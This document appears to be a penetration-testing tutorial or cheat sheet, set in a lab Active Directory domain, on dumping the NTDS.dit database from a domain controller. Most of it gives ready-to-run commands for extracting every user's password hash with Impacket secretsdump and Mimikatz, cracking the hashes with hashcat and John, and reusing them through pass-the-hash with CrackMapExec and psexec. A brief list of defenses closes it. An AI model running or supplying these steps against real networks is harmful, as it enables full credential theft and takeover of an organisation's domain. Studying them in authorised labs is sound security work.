# DUMPING NTDS.DIT - COMPLETE DOMAIN COMPROMISE

Extract the NTDS.dit database file containing all user hashes and sensitive domain information. This is the ultimate goal - complete domain credential compromise.

## Overview

- **What it is**: NT Directory Services database with every domain user's password hash
- **Location**: %SystemRoot%\NTDS\NTDS.dit on domain controllers
- **Impact**: Access to every user account, every computer, every service principal
- **Result**: Complete domain takeover capability

## Prerequisites

- Domain Administrator or System account access on Domain Controller
- Active domain admin session OR
- Physical access to DC backup files

## Using Impacket Secretsdump

Most reliable and comprehensive:

```bash
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@10.0.2.15 -just-dc-nthash
```

### Export All Users and Groups

```bash
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@10.0.2.15 -just-dc -output MARVEL_dump
```

This creates files:
- `MARVEL_dump.ntds` - All user hashes
- `MARVEL_dump.sam` - Local machine hashes
- `MARVEL_dump.secrets` - Machine account credentials

## Crack NTDS Hashes

Once you have dumped NTDS:

### Using Hashcat

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

Mode 1000 = NTLM hashes

### Using John the Ripper

```bash
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash Instead

Don't crack weak passwords - just use the hashes directly:

```bash
crackmapexec smb 10.0.2.0/24 -u administrator -H hash -d MARVEL.local
impacket-psexec -hashes :hash MARVEL.local/administrator@10.0.2.15
```

## Alternative Methods

### Using Mimikatz on DC

```bash
mimikatz.exe
privilege::debug
lsadump::lsa /patch
```

Or dump NTDS directly:

```bash
lsadump::lsa /inject /name:krbtgt
```

### Accessing DC Backup Files

If you have access to domain controller backups:

```bash
esentutl.exe /r V01.chk /d NTDS.dit
```

Then mount and extract the NTDS.dit file.

## What You Get

- **Domain Administrator hashes**: Access to everything
- **Service Account hashes**: Lateral movement capabilities (Kerberoasting, impersonation)
- **Machine account hashes**: Additional entry points
- **User hashes**: Credential spray and lateral movement
- **Computer information**: Identify vulnerable systems
- **Group information**: Understand domain structure and permissions

## Defense

- Enable BitLocker on all domain controllers
- Restrict NTDS.dit file access (SYSTEM only)
- Monitor DC backup access and file modifications
- Implement signing and encryption between DCs
- Change DA passwords frequently
- Monitor NTDS.dit access logs
- Use administrative tier model to limit DA needs
- Consider passwordless authentication (smart cards)